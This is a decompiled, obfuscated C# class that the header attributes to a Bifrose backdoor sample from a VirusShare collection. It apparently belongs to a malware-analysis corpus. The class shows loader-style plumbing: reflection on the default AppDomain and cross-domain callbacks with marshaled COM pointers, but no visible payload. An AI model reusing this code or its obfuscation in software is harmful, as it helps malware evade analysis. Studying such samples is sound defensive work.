// Decompiled with JetBrains decompiler
// Type: õ.í
// Assembly: KSA, Version=5.0.2.3, Culture=neutral, PublicKeyToken=null
// MVID: F5F871CB-3F0D-48DA-B587-E1D33B6A8FB4
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.Bifrose.fvn-69286638be881a065d9108adde810607b5488edeaa76ee2d59b357eb3fd86452.exe

using \u0083õ;
using \u0083û;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0083õ
{
  [Serializable]
  internal class \u0083í
  {
    private IntPtr \u0082Ó;
    private int \u0082Ñ;
    [NonSerialized]
    private AppDomain \u0082Í;

    public \u0083í(AppDomain domain, int domainId)
    {
      this.\u0082Ñ = domainId;
      this.\u0082Í = domain;
      this.\u0082Ó = IntPtr.Zero;
    }

    public void \u0082ï()
    {
      if (this.\u0082Í == null)
        return;
      try
      {
        for (int index = 0; index < 10; ++index)
        {
          try
          {
            string friendlyName = this.\u0082Í.FriendlyName;
            Thread.Sleep(50);
          }
          catch (AppDomainUnloadedException ex)
          {
            break;
          }
        }
      }
      finally
      {
        \u0083ú.\u0082\u0087(this.\u0082Ñ);
      }
    }

    public static AppDomain \u0081Ø()
    {
      MethodInfo method = typeof (AppDomain).GetMethod("GetDefaultDomain", BindingFlags.Static | BindingFlags.NonPublic);
      return method == (MethodInfo) null ? (AppDomain) null : method.Invoke((object) null, (object[]) null) as AppDomain;
    }

    public void \u0081Ó()
    {
      Marshal.GetObjectForIUnknown(this.\u0082Ó);
      Marshal.Release(this.\u0082Ó);
      this.\u0082Ó = IntPtr.Zero;
      new Thread(new ThreadStart(this.\u0082ï)).Start();
    }

    public void \u0082Ý(object _param1, EventArgs _param2)
    {
      AppDomain appDomain = \u0083í.\u0081Ø();
      if (appDomain == null)
        return;
      CrossAppDomainDelegate callBackDelegate = new CrossAppDomainDelegate(this.\u0081Ó);
      this.\u0082Ó = Marshal.GetIUnknownForObject((object) this.\u0082Í);
      this.\u0082Í = (AppDomain) null;
      appDomain.DoCallBack(callBackDelegate);
    }
  }
}
